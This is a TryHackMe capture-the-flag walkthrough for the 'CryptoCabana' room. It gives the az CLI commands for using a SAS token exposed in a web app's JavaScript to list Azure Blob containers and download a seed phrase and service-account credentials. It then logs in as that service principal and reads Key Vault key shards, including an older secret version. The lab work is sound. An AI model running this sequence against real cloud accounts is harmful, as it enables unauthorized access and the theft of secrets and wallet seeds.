<p align="center">
  <img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785218019756&w=96&q=75"> 
</p>

# CryptoCabana

In this room, use the discovered sensitive information, such as the Azure Storage account name and SAS token, to access and explore the Blob Storage resources.


Target application:
```URL
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

## STEP 01
- Open the webapp
```URL
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```
- Then go to the `Source page`
- Then click the `app.js`
- Then, you will see the cloud storage configuration details.
```COPY
ACCOUNT
SAS
```

## STEP 02
- Steup Environment
```bash
ACCOUNT="Value"
SAS="Value"

```

- List every container in the storage account
```bash
az storage container list \
  --account-name "$ACCOUNT" \
  --sas-token "$SAS" \
  --query '[].name' \
  --output table
```

- Enumerated the contents of vault:
```bash
az storage blob list \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --sas-token "$SAS" \
  --query '[].{Name:name,Size:properties.contentLength,Modified:properties.lastModified}' \
  --output table
```

- Download the seed phrase:
```bash
az storage blob download \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --name 'seed_phrase.txt' \
  --sas-token "$SAS" \
  --file seed_phrase.txt \
  --output none
```

- Read the `send_phrase`
```bash
cat seed_phrase.txt
```

- Download the service-account file
```bash
az storage blob download \
  --account-name "$ACCOUNT" \
  --container-name 'vault' \
  --name 'backup-service-account.json' \
  --sas-token "$SAS" \
  --file backup-service-account.json \
  --output none
```

- Read the the JSON:
```bash
jq . backup-service-account.json
```

- Then configure the account details in terminal
```bash
CLIENT_ID=$(jq -r '.client_id' backup-service-account.json)
CLIENT_SECRET=$(jq -r '.client_secret' backup-service-account.json)
TENANT_ID=$(jq -r '.tenant_id' backup-service-account.json)
VAULT_NAME=$(jq -r '.key_vault_name' backup-service-account.json)
```

- Authenticated as the service principal
```bash
az login \
  --service-principal \
  --username "$CLIENT_ID" \
  --password "$CLIENT_SECRET" \
  --tenant "$TENANT_ID" \
  --allow-no-subscriptions \
  --output none
```

- Verify the current identity
```bash
az account show --query user --output json
```

- Then listed secret names and metadata
```bash
az keyvault secret list \
  --vault-name "$VAULT_NAME" \
  --query '[].{Name:name,Enabled:attributes.enabled,Updated:attributes.updated}' \
  --output table
```

- Retrieved the current value of each shard
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-1' \
  --query value \
  --output tsv
```

```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --query value \
  --output tsv
```

```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-3' \
  --query value \
  --output tsv
```

- Recover the older version of `key-shard-2`
 > Azure Key Vault secrets are versioned. When someone updates a secret, Azure normally creates a new version. The previous version is not automatically destroyed.

- List all versions of `key-shard-2`
```
az keyvault secret list-versions \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --query '[].{Version:id,Created:attributes.created,Updated:attributes.updated,Enabled:attributes.enabled}' \
  --output table
```

- Choose the earlier version, take the final `VERSION_ID` component, and request that specific version:
```
az keyvault secret show \
  --vault-name "$VAULT_NAME" \
  --name 'key-shard-2' \
  --version '3d6492d2c6f74123bc754a9ded22b2a0' \
  --query value \
  --output tsv
```

- Then, combine all three parts of the key to obtain the flag.
```
key-shard-1 + key-shard-2 + key-shard-3
```
  
## You have found the  **FLAGs** 🚩

# Congratulations on our Exploration 🎉
